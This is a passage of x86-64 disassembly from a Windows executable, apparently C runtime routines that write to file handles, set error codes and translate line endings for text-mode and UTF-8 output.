   1400094ff:	eb 13                	jmp    0x140009514
   140009501:	e8 f6 cd ff ff       	call   0x1400062fc
   140009506:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000950c:	e8 bf c3 ff ff       	call   0x1400058d0
   140009511:	83 c8 ff             	or     $0xffffffff,%eax
   140009514:	48 83 c4 38          	add    $0x38,%rsp
   140009518:	c3                   	ret
   140009519:	cc                   	int3
   14000951a:	cc                   	int3
   14000951b:	cc                   	int3
   14000951c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009521:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140009526:	57                   	push   %rdi
   140009527:	48 83 ec 20          	sub    $0x20,%rsp
   14000952b:	49 8b f9             	mov    %r9,%rdi
   14000952e:	49 8b d8             	mov    %r8,%rbx
   140009531:	8b 0a                	mov    (%rdx),%ecx
   140009533:	e8 e4 ef ff ff       	call   0x14000851c
   140009538:	90                   	nop
   140009539:	48 8b 03             	mov    (%rbx),%rax
   14000953c:	48 63 08             	movslq (%rax),%rcx
   14000953f:	48 8b d1             	mov    %rcx,%rdx
   140009542:	48 8b c1             	mov    %rcx,%rax
   140009545:	48 c1 f8 06          	sar    $0x6,%rax
   140009549:	4c 8d 05 a0 f1 00 00 	lea    0xf1a0(%rip),%r8        # 0x1400186f0
   140009550:	83 e2 3f             	and    $0x3f,%edx
   140009553:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   140009557:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000955b:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140009560:	74 24                	je     0x140009586
   140009562:	e8 e1 ec ff ff       	call   0x140008248
   140009567:	48 8b c8             	mov    %rax,%rcx
   14000956a:	ff 15 28 c2 00 00    	call   *0xc228(%rip)        # 0x140015798
   140009570:	33 db                	xor    %ebx,%ebx
   140009572:	85 c0                	test   %eax,%eax
   140009574:	75 1e                	jne    0x140009594
   140009576:	e8 a1 cd ff ff       	call   0x14000631c
   14000957b:	48 8b d8             	mov    %rax,%rbx
   14000957e:	ff 15 84 c2 00 00    	call   *0xc284(%rip)        # 0x140015808
   140009584:	89 03                	mov    %eax,(%rbx)
   140009586:	e8 71 cd ff ff       	call   0x1400062fc
   14000958b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009591:	83 cb ff             	or     $0xffffffff,%ebx
   140009594:	8b 0f                	mov    (%rdi),%ecx
   140009596:	e8 a9 ef ff ff       	call   0x140008544
   14000959b:	8b c3                	mov    %ebx,%eax
   14000959d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400095a2:	48 83 c4 20          	add    $0x20,%rsp
   1400095a6:	5f                   	pop    %rdi
   1400095a7:	c3                   	ret
   1400095a8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400095ad:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400095b2:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400095b6:	57                   	push   %rdi
   1400095b7:	41 54                	push   %r12
   1400095b9:	41 55                	push   %r13
   1400095bb:	41 56                	push   %r14
   1400095bd:	41 57                	push   %r15
   1400095bf:	48 83 ec 20          	sub    $0x20,%rsp
   1400095c3:	45 8b f0             	mov    %r8d,%r14d
   1400095c6:	4c 8b fa             	mov    %rdx,%r15
   1400095c9:	48 63 d9             	movslq %ecx,%rbx
   1400095cc:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1400095cf:	75 18                	jne    0x1400095e9
   1400095d1:	e8 46 cd ff ff       	call   0x14000631c
   1400095d6:	83 20 00             	andl   $0x0,(%rax)
   1400095d9:	e8 1e cd ff ff       	call   0x1400062fc
   1400095de:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400095e4:	e9 8f 00 00 00       	jmp    0x140009678
   1400095e9:	85 c9                	test   %ecx,%ecx
   1400095eb:	78 73                	js     0x140009660
   1400095ed:	3b 1d fd f4 00 00    	cmp    0xf4fd(%rip),%ebx        # 0x140018af0
   1400095f3:	73 6b                	jae    0x140009660
   1400095f5:	48 8b c3             	mov    %rbx,%rax
   1400095f8:	48 8b f3             	mov    %rbx,%rsi
   1400095fb:	48 c1 fe 06          	sar    $0x6,%rsi
   1400095ff:	4c 8d 2d ea f0 00 00 	lea    0xf0ea(%rip),%r13        # 0x1400186f0
   140009606:	83 e0 3f             	and    $0x3f,%eax
   140009609:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   14000960d:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   140009612:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   140009618:	74 46                	je     0x140009660
   14000961a:	8b cb                	mov    %ebx,%ecx
   14000961c:	e8 fb ee ff ff       	call   0x14000851c
   140009621:	83 cf ff             	or     $0xffffffff,%edi
   140009624:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   140009629:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000962f:	75 15                	jne    0x140009646
   140009631:	e8 c6 cc ff ff       	call   0x1400062fc
   140009636:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000963c:	e8 db cc ff ff       	call   0x14000631c
   140009641:	83 20 00             	andl   $0x0,(%rax)
   140009644:	eb 0f                	jmp    0x140009655
   140009646:	45 8b c6             	mov    %r14d,%r8d
   140009649:	49 8b d7             	mov    %r15,%rdx
   14000964c:	8b cb                	mov    %ebx,%ecx
   14000964e:	e8 41 00 00 00       	call   0x140009694
   140009653:	8b f8                	mov    %eax,%edi
   140009655:	8b cb                	mov    %ebx,%ecx
   140009657:	e8 e8 ee ff ff       	call   0x140008544
   14000965c:	8b c7                	mov    %edi,%eax
   14000965e:	eb 1b                	jmp    0x14000967b
   140009660:	e8 b7 cc ff ff       	call   0x14000631c
   140009665:	83 20 00             	andl   $0x0,(%rax)
   140009668:	e8 8f cc ff ff       	call   0x1400062fc
   14000966d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009673:	e8 58 c2 ff ff       	call   0x1400058d0
   140009678:	83 c8 ff             	or     $0xffffffff,%eax
   14000967b:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140009680:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140009685:	48 83 c4 20          	add    $0x20,%rsp
   140009689:	41 5f                	pop    %r15
   14000968b:	41 5e                	pop    %r14
   14000968d:	41 5d                	pop    %r13
   14000968f:	41 5c                	pop    %r12
   140009691:	5f                   	pop    %rdi
   140009692:	c3                   	ret
   140009693:	cc                   	int3
   140009694:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009699:	55                   	push   %rbp
   14000969a:	56                   	push   %rsi
   14000969b:	57                   	push   %rdi
   14000969c:	41 54                	push   %r12
   14000969e:	41 55                	push   %r13
   1400096a0:	41 56                	push   %r14
   1400096a2:	41 57                	push   %r15
   1400096a4:	48 8b ec             	mov    %rsp,%rbp
   1400096a7:	48 83 ec 60          	sub    $0x60,%rsp
   1400096ab:	33 db                	xor    %ebx,%ebx
   1400096ad:	45 8b f0             	mov    %r8d,%r14d
   1400096b0:	4c 63 e1             	movslq %ecx,%r12
   1400096b3:	48 8b fa             	mov    %rdx,%rdi
   1400096b6:	45 85 c0             	test   %r8d,%r8d
   1400096b9:	0f 84 9e 02 00 00    	je     0x14000995d
   1400096bf:	48 85 d2             	test   %rdx,%rdx
   1400096c2:	75 1f                	jne    0x1400096e3
   1400096c4:	e8 53 cc ff ff       	call   0x14000631c
   1400096c9:	89 18                	mov    %ebx,(%rax)
   1400096cb:	e8 2c cc ff ff       	call   0x1400062fc
   1400096d0:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400096d6:	e8 f5 c1 ff ff       	call   0x1400058d0
   1400096db:	83 c8 ff             	or     $0xffffffff,%eax
   1400096de:	e9 7c 02 00 00       	jmp    0x14000995f
   1400096e3:	49 8b c4             	mov    %r12,%rax
   1400096e6:	48 8d 0d 03 f0 00 00 	lea    0xf003(%rip),%rcx        # 0x1400186f0
   1400096ed:	83 e0 3f             	and    $0x3f,%eax
   1400096f0:	4d 8b ec             	mov    %r12,%r13
   1400096f3:	49 c1 fd 06          	sar    $0x6,%r13
   1400096f7:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   1400096fb:	4a 8b 0c e9          	mov    (%rcx,%r13,8),%rcx
   1400096ff:	42 0f be 74 f9 39    	movsbl 0x39(%rcx,%r15,8),%esi
   140009705:	8d 46 ff             	lea    -0x1(%rsi),%eax
   140009708:	3c 01                	cmp    $0x1,%al
   14000970a:	77 09                	ja     0x140009715
   14000970c:	41 8b c6             	mov    %r14d,%eax
   14000970f:	f7 d0                	not    %eax
   140009711:	a8 01                	test   $0x1,%al
   140009713:	74 af                	je     0x1400096c4
   140009715:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   14000971b:	74 0e                	je     0x14000972b
   14000971d:	33 d2                	xor    %edx,%edx
   14000971f:	41 8b cc             	mov    %r12d,%ecx
   140009722:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   140009726:	e8 01 1c 00 00       	call   0x14000b32c
   14000972b:	41 8b cc             	mov    %r12d,%ecx
   14000972e:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   140009732:	e8 d9 0b 00 00       	call   0x14000a310
   140009737:	85 c0                	test   %eax,%eax
   140009739:	0f 84 0b 01 00 00    	je     0x14000984a
   14000973f:	48 8d 05 aa ef 00 00 	lea    0xefaa(%rip),%rax        # 0x1400186f0
   140009746:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000974a:	42 38 5c f8 38       	cmp    %bl,0x38(%rax,%r15,8)
   14000974f:	0f 8d f5 00 00 00    	jge    0x14000984a
   140009755:	e8 46 ad ff ff       	call   0x1400044a0
   14000975a:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140009761:	48 39 99 38 01 00 00 	cmp    %rbx,0x138(%rcx)
   140009768:	75 16                	jne    0x140009780
   14000976a:	48 8d 05 7f ef 00 00 	lea    0xef7f(%rip),%rax        # 0x1400186f0
   140009771:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   140009775:	42 38 5c f8 39       	cmp    %bl,0x39(%rax,%r15,8)
   14000977a:	0f 84 ca 00 00 00    	je     0x14000984a
   140009780:	48 8d 05 69 ef 00 00 	lea    0xef69(%rip),%rax        # 0x1400186f0
   140009787:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000978b:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000978f:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   140009794:	ff 15 36 c0 00 00    	call   *0xc036(%rip)        # 0x1400157d0
   14000979a:	85 c0                	test   %eax,%eax
   14000979c:	0f 84 a8 00 00 00    	je     0x14000984a
   1400097a2:	40 84 f6             	test   %sil,%sil
   1400097a5:	0f 84 81 00 00 00    	je     0x14000982c
   1400097ab:	40 fe ce             	dec    %sil
   1400097ae:	40 80 fe 01          	cmp    $0x1,%sil
   1400097b2:	0f 87 2e 01 00 00    	ja     0x1400098e6
   1400097b8:	4e 8d 24 37          	lea    (%rdi,%r14,1),%r12
   1400097bc:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   1400097c0:	4c 8b f7             	mov    %rdi,%r14
   1400097c3:	49 3b fc             	cmp    %r12,%rdi
   1400097c6:	0f 83 10 01 00 00    	jae    0x1400098dc
   1400097cc:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   1400097cf:	41 0f b7 06          	movzwl (%r14),%eax
   1400097d3:	0f b7 c8             	movzwl %ax,%ecx
   1400097d6:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   1400097da:	e8 a5 1d 00 00       	call   0x14000b584
   1400097df:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   1400097e3:	66 3b c1             	cmp    %cx,%ax
   1400097e6:	75 36                	jne    0x14000981e
   1400097e8:	83 c6 02             	add    $0x2,%esi
   1400097eb:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   1400097ee:	66 83 f9 0a          	cmp    $0xa,%cx
   1400097f2:	75 1b                	jne    0x14000980f
   1400097f4:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400097f9:	e8 86 1d 00 00       	call   0x14000b584
   1400097fe:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140009803:	66 3b c1             	cmp    %cx,%ax
   140009806:	75 16                	jne    0x14000981e
   140009808:	ff c6                	inc    %esi
   14000980a:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000980d:	ff c3                	inc    %ebx
   14000980f:	49 83 c6 02          	add    $0x2,%r14
   140009813:	4d 3b f4             	cmp    %r12,%r14
   140009816:	0f 83 c0 00 00 00    	jae    0x1400098dc
   14000981c:	eb b1                	jmp    0x1400097cf
   14000981e:	ff 15 e4 bf 00 00    	call   *0xbfe4(%rip)        # 0x140015808
   140009824:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140009827:	e9 b0 00 00 00       	jmp    0x1400098dc
   14000982c:	45 8b ce             	mov    %r14d,%r9d
   14000982f:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140009833:	4c 8b c7             	mov    %rdi,%r8
   140009836:	41 8b d4             	mov    %r12d,%edx
   140009839:	e8 3a 01 00 00       	call   0x140009978
   14000983e:	f2 0f 10 00          	movsd  (%rax),%xmm0
   140009842:	8b 58 08             	mov    0x8(%rax),%ebx
   140009845:	e9 97 00 00 00       	jmp    0x1400098e1
   14000984a:	48 8d 05 9f ee 00 00 	lea    0xee9f(%rip),%rax        # 0x1400186f0
   140009851:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   140009855:	42 38 5c f9 38       	cmp    %bl,0x38(%rcx,%r15,8)
   14000985a:	7d 4d                	jge    0x1400098a9
   14000985c:	8b ce                	mov    %esi,%ecx
   14000985e:	40 84 f6             	test   %sil,%sil
   140009861:	74 32                	je     0x140009895
   140009863:	83 e9 01             	sub    $0x1,%ecx
   140009866:	74 19                	je     0x140009881
   140009868:	83 f9 01             	cmp    $0x1,%ecx
   14000986b:	75 79                	jne    0x1400098e6
   14000986d:	45 8b ce             	mov    %r14d,%r9d
   140009870:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140009874:	4c 8b c7             	mov    %rdi,%r8
   140009877:	41 8b d4             	mov    %r12d,%edx
   14000987a:	e8 e9 06 00 00       	call   0x140009f68
   14000987f:	eb bd                	jmp    0x14000983e
   140009881:	45 8b ce             	mov    %r14d,%r9d
   140009884:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140009888:	4c 8b c7             	mov    %rdi,%r8
   14000988b:	41 8b d4             	mov    %r12d,%edx
   14000988e:	e8 f1 07 00 00       	call   0x14000a084
   140009893:	eb a9                	jmp    0x14000983e
   140009895:	45 8b ce             	mov    %r14d,%r9d
   140009898:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000989c:	4c 8b c7             	mov    %rdi,%r8
   14000989f:	41 8b d4             	mov    %r12d,%edx
   1400098a2:	e8 bd 05 00 00       	call   0x140009e64
   1400098a7:	eb 95                	jmp    0x14000983e
   1400098a9:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   1400098ae:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   1400098b2:	33 c0                	xor    %eax,%eax
   1400098b4:	45 8b c6             	mov    %r14d,%r8d
   1400098b7:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   1400098bc:	48 8b d7             	mov    %rdi,%rdx
   1400098bf:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400098c3:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400098c6:	ff 15 9c c0 00 00    	call   *0xc09c(%rip)        # 0x140015968
   1400098cc:	85 c0                	test   %eax,%eax
   1400098ce:	75 09                	jne    0x1400098d9
   1400098d0:	ff 15 32 bf 00 00    	call   *0xbf32(%rip)        # 0x140015808
   1400098d6:	89 45 d0             	mov    %eax,-0x30(%rbp)
   1400098d9:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   1400098dc:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   1400098e1:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   1400098e6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400098ea:	48 c1 e8 20          	shr    $0x20,%rax
   1400098ee:	85 c0                	test   %eax,%eax
   1400098f0:	75 64                	jne    0x140009956
   1400098f2:	8b 45 e0             	mov    -0x20(%rbp),%eax
   1400098f5:	85 c0                	test   %eax,%eax
   1400098f7:	74 2d                	je     0x140009926
   1400098f9:	83 f8 05             	cmp    $0x5,%eax
   1400098fc:	75 1b                	jne    0x140009919
   1400098fe:	e8 f9 c9 ff ff       	call   0x1400062fc
   140009903:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009909:	e8 0e ca ff ff       	call   0x14000631c
   14000990e:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   140009914:	e9 c2 fd ff ff       	jmp    0x1400096db
   140009919:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000991c:	e8 1b ca ff ff       	call   0x14000633c
   140009921:	e9 b5 fd ff ff       	jmp    0x1400096db
   140009926:	48 8d 05 c3 ed 00 00 	lea    0xedc3(%rip),%rax        # 0x1400186f0
   14000992d:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   140009931:	42 f6 44 f8 38 40    	testb  $0x40,0x38(%rax,%r15,8)
   140009937:	74 05                	je     0x14000993e
   140009939:	80 3f 1a             	cmpb   $0x1a,(%rdi)
   14000993c:	74 1f                	je     0x14000995d
   14000993e:	e8 b9 c9 ff ff       	call   0x1400062fc
   140009943:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   140009949:	e8 ce c9 ff ff       	call   0x14000631c
   14000994e:	83 20 00             	andl   $0x0,(%rax)
   140009951:	e9 85 fd ff ff       	jmp    0x1400096db
   140009956:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140009959:	2b c3                	sub    %ebx,%eax
   14000995b:	eb 02                	jmp    0x14000995f
   14000995d:	33 c0                	xor    %eax,%eax
   14000995f:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140009966:	00 
   140009967:	48 83 c4 60          	add    $0x60,%rsp
   14000996b:	41 5f                	pop    %r15
   14000996d:	41 5e                	pop    %r14
   14000996f:	41 5d                	pop    %r13
   140009971:	41 5c                	pop    %r12
   140009973:	5f                   	pop    %rdi
   140009974:	5e                   	pop    %rsi
   140009975:	5d                   	pop    %rbp
   140009976:	c3                   	ret
   140009977:	cc                   	int3
   140009978:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000997d:	55                   	push   %rbp
   14000997e:	56                   	push   %rsi
   14000997f:	57                   	push   %rdi
   140009980:	41 54                	push   %r12
   140009982:	41 55                	push   %r13
   140009984:	41 56                	push   %r14
   140009986:	41 57                	push   %r15
   140009988:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   14000998d:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   140009994:	48 8b 05 9d d6 00 00 	mov    0xd69d(%rip),%rax        # 0x140017038
   14000999b:	48 33 c4             	xor    %rsp,%rax
   14000999e:	48 89 45 17          	mov    %rax,0x17(%rbp)
   1400099a2:	48 63 f2             	movslq %edx,%rsi
   1400099a5:	4d 8b f8             	mov    %r8,%r15
   1400099a8:	48 8b c6             	mov    %rsi,%rax
   1400099ab:	48 89 4d f7          	mov    %rcx,-0x9(%rbp)
   1400099af:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   1400099b3:	48 8d 0d 46 66 ff ff 	lea    -0x99ba(%rip),%rcx        # 0x140000000
   1400099ba:	83 e0 3f             	and    $0x3f,%eax
   1400099bd:	45 8b e9             	mov    %r9d,%r13d
   1400099c0:	4d 03 e8             	add    %r8,%r13
   1400099c3:	4c 89 45 df          	mov    %r8,-0x21(%rbp)
   1400099c7:	4c 8b e6             	mov    %rsi,%r12
   1400099ca:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   1400099ce:	49 c1 fc 06          	sar    $0x6,%r12
   1400099d2:	4c 8d 34 c0          	lea    (%rax,%rax,8),%r14
   1400099d6:	4a 8b 84 e1 f0 86 01 	mov    0x186f0(%rcx,%r12,8),%rax
   1400099dd:	00 
   1400099de:	4a 8b 44 f0 28       	mov    0x28(%rax,%r14,8),%rax
   1400099e3:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400099e7:	ff 15 eb bd 00 00    	call   *0xbdeb(%rip)        # 0x1400157d8
   1400099ed:	33 d2                	xor    %edx,%edx
   1400099ef:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400099f4:	89 45 a7             	mov    %eax,-0x59(%rbp)
   1400099f7:	e8 58 b3 ff ff       	call   0x140004d54
   1400099fc:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140009a01:	45 33 db             	xor    %r11d,%r11d
   140009a04:	44 89 5d 97          	mov    %r11d,-0x69(%rbp)
   140009a08:	41 8b db             	mov    %r11d,%ebx
   140009a0b:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   140009a0e:	49 8b ff             	mov    %r15,%rdi
   140009a11:	8b 51 0c             	mov    0xc(%rcx),%edx
   140009a14:	41 8b cb             	mov    %r11d,%ecx
   140009a17:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   140009a1b:	89 55 ab             	mov    %edx,-0x55(%rbp)
   140009a1e:	4d 3b fd             	cmp    %r13,%r15
   140009a21:	0f 83 e2 03 00 00    	jae    0x140009e09
   140009a27:	48 8b c6             	mov    %rsi,%rax
   140009a2a:	49 8b f7             	mov    %r15,%rsi
   140009a2d:	48 c1 f8 06          	sar    $0x6,%rax
   140009a31:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   140009a35:	8a 0f                	mov    (%rdi),%cl
   140009a37:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140009a3d:	88 4c 24 44          	mov    %cl,0x44(%rsp)
   140009a41:	44 89 5c 24 48       	mov    %r11d,0x48(%rsp)
   140009a46:	81 fa e9 fd 00 00    	cmp    $0xfde9,%edx
   140009a4c:	0f 85 70 01 00 00    	jne    0x140009bc2
   140009a52:	4c 8d 3d a7 65 ff ff 	lea    -0x9a59(%rip),%r15        # 0x140000000
   140009a59:	41 8b d3             	mov    %r11d,%edx
   140009a5c:	4d 8b 8c c7 f0 86 01 	mov    0x186f0(%r15,%rax,8),%r9
   140009a63:	00 
   140009a64:	49 8b f3             	mov    %r11,%rsi
   140009a67:	4b 8d 04 f1          	lea    (%r9,%r14,8),%rax
   140009a6b:	44 38 5c 30 3e       	cmp    %r11b,0x3e(%rax,%rsi,1)
   140009a70:	74 0b                	je     0x140009a7d
   140009a72:	ff c2                	inc    %edx
   140009a74:	48 ff c6             	inc    %rsi
   140009a77:	48 83 fe 05          	cmp    $0x5,%rsi
   140009a7b:	7c ee                	jl     0x140009a6b
   140009a7d:	48 85 f6             	test   %rsi,%rsi
   140009a80:	0f 8e e0 00 00 00    	jle    0x140009b66
   140009a86:	4b 8b 84 e7 f0 86 01 	mov    0x186f0(%r15,%r12,8),%rax
   140009a8d:	00 
   140009a8e:	4c 8b 45 af          	mov    -0x51(%rbp),%r8
   140009a92:	4c 2b c7             	sub    %rdi,%r8
   140009a95:	42 0f b6 4c f0 3e    	movzbl 0x3e(%rax,%r14,8),%ecx
   140009a9b:	46 0f be bc 39 f0 78 	movsbl 0x178f0(%rcx,%r15,1),%r15d
   140009aa2:	01 00 
   140009aa4:	41 ff c7             	inc    %r15d
   140009aa7:	45 8b ef             	mov    %r15d,%r13d
   140009aaa:	44 2b ea             	sub    %edx,%r13d
   140009aad:	4d 63 d5             	movslq %r13d,%r10
   140009ab0:	4d 3b d0             	cmp    %r8,%r10
   140009ab3:	0f 8f 78 02 00 00    	jg     0x140009d31
   140009ab9:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   140009abd:	49 8b d3             	mov    %r11,%rdx
   140009ac0:	4c 2b c8             	sub    %rax,%r9
   140009ac3:	4f 8d 04 f1          	lea    (%r9,%r14,8),%r8
   140009ac7:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   140009acb:	48 03 ca             	add    %rdx,%rcx
   140009ace:	48 ff c2             	inc    %rdx
   140009ad1:	42 8a 44 01 3e       	mov    0x3e(%rcx,%r8,1),%al
   140009ad6:	88 01                	mov    %al,(%rcx)
   140009ad8:	48 3b d6             	cmp    %rsi,%rdx
   140009adb:	7c ea                	jl     0x140009ac7
   140009add:	45 85 ed             	test   %r13d,%r13d
   140009ae0:	7e 15                	jle    0x140009af7
   140009ae2:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   140009ae6:	4d 8b c2             	mov    %r10,%r8
   140009ae9:	48 03 ce             	add    %rsi,%rcx
   140009aec:	48 8b d7             	mov    %rdi,%rdx
   140009aef:	e8 3c ee ff ff       	call   0x140008930
   140009af4:	45 33 db             	xor    %r11d,%r11d
   140009af7:	49 8b d3             	mov    %r11,%rdx
   140009afa:	4c 8d 05 ff 64 ff ff 	lea    -0x9b01(%rip),%r8        # 0x140000000
   140009b01:	4b 8b 8c e0 f0 86 01 	mov    0x186f0(%r8,%r12,8),%rcx
   140009b08:	00 
   140009b09:	48 03 ca             	add    %rdx,%rcx
   140009b0c:	48 ff c2             	inc    %rdx
   140009b0f:	46 88 5c f1 3e       	mov    %r11b,0x3e(%rcx,%r14,8)
   140009b14:	48 3b d6             	cmp    %rsi,%rdx
   140009b17:	7c e8                	jl     0x140009b01
   140009b19:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   140009b1d:	4c 89 5d bf          	mov    %r11,-0x41(%rbp)
   140009b21:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140009b25:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   140009b29:	41 8b c3             	mov    %r11d,%eax
   140009b2c:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   140009b30:	41 83 ff 04          	cmp    $0x4,%r15d
   140009b34:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140009b39:	0f 94 c0             	sete   %al
   140009b3c:	ff c0                	inc    %eax
   140009b3e:	44 8b c0             	mov    %eax,%r8d
   140009b41:	44 8b f8             	mov    %eax,%r15d
   140009b44:	e8 c3 18 00 00       	call   0x14000b40c
   140009b49:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140009b4d:	0f 84 d7 00 00 00    	je     0x140009c2a
   140009b53:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   140009b57:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   140009b5b:	48 63 f0             	movslq %eax,%rsi
   140009b5e:	48 03 f7             	add    %rdi,%rsi
   140009b61:	e9 e6 00 00 00       	jmp    0x140009c4c
   140009b66:	0f b6 07             	movzbl (%rdi),%eax
   140009b69:	49 8b d5             	mov    %r13,%rdx
   140009b6c:	48 2b d7             	sub    %rdi,%rdx
   140009b6f:	4a 0f be b4 38 f0 78 	movsbq 0x178f0(%rax,%r15,1),%rsi
   140009b76:	01 00 
   140009b78:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140009b7b:	48 63 c1             	movslq %ecx,%rax
   140009b7e:	48 3b c2             	cmp    %rdx,%rax
   140009b81:	0f 8f e4 01 00 00    	jg     0x140009d6b
   140009b87:	83 f9 04             	cmp    $0x4,%ecx
   140009b8a:	4c 89 5d cf          	mov    %r11,-0x31(%rbp)
   140009b8e:	41 8b c3             	mov    %r11d,%eax
   140009b91:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   140009b95:	0f 94 c0             	sete   %al
   140009b98:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   140009b9c:	ff c0                	inc    %eax
   140009b9e:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   140009ba2:	44 8b c0             	mov    %eax,%r8d
   140009ba5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140009baa:	8b d8                	mov    %eax,%ebx
   140009bac:	e8 5b 18 00 00       	call   0x14000b40c
   140009bb1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140009bb5:	74 73                	je     0x140009c2a
   140009bb7:	48 03 f7             	add    %rdi,%rsi
   140009bba:	44 8b fb             	mov    %ebx,%r15d
   140009bbd:	e9 8a 00 00 00       	jmp    0x140009c4c
   140009bc2:	48 8d 05 37 64 ff ff 	lea    -0x9bc9(%rip),%rax        # 0x140000000
   140009bc9:	4a 8b 94 e0 f0 86 01 	mov    0x186f0(%rax,%r12,8),%rdx
   140009bd0:	00 
   140009bd1:	42 8a 4c f2 3d       	mov    0x3d(%rdx,%r14,8),%cl
   140009bd6:	f6 c1 04             	test   $0x4,%cl
   140009bd9:	74 1b                	je     0x140009bf6
   140009bdb:	42 8a 44 f2 3e       	mov    0x3e(%rdx,%r14,8),%al
   140009be0:	80 e1 fb             	and    $0xfb,%cl
   140009be3:	88 45 07             	mov    %al,0x7(%rbp)
   140009be6:	8a 07                	mov    (%rdi),%al
   140009be8:	42 88 4c f2 3d       	mov    %cl,0x3d(%rdx,%r14,8)
   140009bed:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   140009bf1:	88 45 08             	mov    %al,0x8(%rbp)
   140009bf4:	eb 1f                	jmp    0x140009c15
   140009bf6:	e8 ed ca ff ff       	call   0x1400066e8
   140009bfb:	0f b6 0f             	movzbl (%rdi),%ecx
   140009bfe:	33 d2                	xor    %edx,%edx
   140009c00:	66 39 14 48          	cmp    %dx,(%rax,%rcx,2)
